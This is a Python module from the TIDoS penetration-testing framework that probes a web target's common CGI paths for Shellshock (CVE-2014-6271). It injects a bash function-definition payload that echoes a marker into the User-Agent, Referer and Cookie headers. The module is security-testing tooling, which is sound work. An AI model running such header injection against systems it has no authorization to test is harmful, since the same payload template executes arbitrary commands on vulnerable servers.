#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework

"""Shellshock (CVE-2014-6271) in CGI scripts."""

from __future__ import annotations

from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin

import core.variables as variables
from core.methods import fileinj, inject
from core.methods import modkit as kit
from core.methods.print import pvln

info = ("Tests CGI scripts for Shellshock (CVE-2014-6271). A bash function definition followed by "
        "a command that echoes a random marker plus an arithmetic expansion is sent in the User-Agent, "
        "Referer and Cookie headers; only the computed value in the response (body or headers) counts, "
        "so pages that reflect headers or fail with 500 are not reported. PATH selects the script(s); by "
        "default the target URL and a list of common CGI paths are tested.")
searchinfo = "Shellshock Tester"
properties = {
    "PATH": ["Comma-separated CGI path(s) or URL(s) to test (default: target URL + common CGI paths)", ""],
}

CGI_PATHS = (
    "/cgi-bin/test.cgi", "/cgi-bin/test-cgi", "/cgi-bin/test.sh", "/cgi-bin/test",
    "/cgi-bin/status", "/cgi-bin/stats", "/cgi-bin/printenv", "/cgi-bin/env.cgi",
    "/cgi-bin/hello.cgi", "/cgi-bin/hello.sh", "/cgi-bin/info.cgi", "/cgi-bin/index.cgi",
    "/cgi-bin/admin.cgi", "/cgi-bin/login.cgi", "/cgi-bin/count.cgi", "/cgi-bin/php",
    "/cgi-bin/bash", "/cgi-bin/sh", "/cgi-mod/index.cgi", "/cgi-sys/entropysearch.cgi",
    "/cgi-sys/defaultwebpage.cgi", "/cgi-bin-sdb/printenv", "/cgi-bin/poc.cgi",
)
HEADERS = ("User-Agent", "Referer", "Cookie")


def targets(web) -> list[str]:
    base = kit.url(web) + "/"
    raw = kit.option(properties, "PATH", "CGI path(s) to test, comma-separated (enter for defaults)", "")
    paths = [p.strip() for p in raw.split(",") if p.strip()] if raw else [kit.url(web), *CGI_PATHS]
    return list(dict.fromkeys(urljoin(base, p) if "://" not in p else p for p in paths))


def probe(s, url: str) -> str:
    """Evidence string when `url` runs our command, '' otherwise."""
    a, b = fileinj.numbers()
    m = inject.marker(5)
    expect = f"{m}{a * b}"
    cmd = f"() {{ :;}}; echo; echo {m}$(({a}*{b}))"
    try:
        r = s.get(url, headers={h: cmd for h in HEADERS}, allow_redirects=False)
    except Exception:
        return ""
    seen = fileinj.body(r) + "\n" + fileinj.headers_text(r)
    if expect not in seen:
        return ""
    return f"'echo {m}$(({a}*{b}))' in the headers -> {expect} in the response (HTTP {r.status_code})"


def exists(s, url: str) -> bool:
    try:
        return s.get(url, allow_redirects=False).status_code != 404
    except Exception:
        return False


def shellshock(web):
    pvln("shellshock")
    rec = kit.Recorder(web, kit.CRITICAL, "shellshock")
    s = kit.http(timeout=10)
    urls = targets(web)
    kit.info(f"Checking {len(urls)} URL(s)...")

    def test(url: str) -> str:
        return probe(s, url) if exists(s, url) else ""

    with ThreadPoolExecutor(max_workers=max(1, min(variables.processes, len(urls), 16))) as pool:
        results = list(zip(urls, pool.map(test, urls)))

    hits = [(url, ev) for url, ev in results if ev]
    if not hits:
        kit.bad("No Shellshock found.")
        rec("No Shellshock found.")
        return []
    for url, ev in hits:
        kit.found("Shellshock (confirmed)", url)
        kit.bullet(ev)
    rec(f"Shellshock (confirmed): {url} -- {ev}" for url, ev in hits)
    return hits


def attack(web):
    shellshock(web)
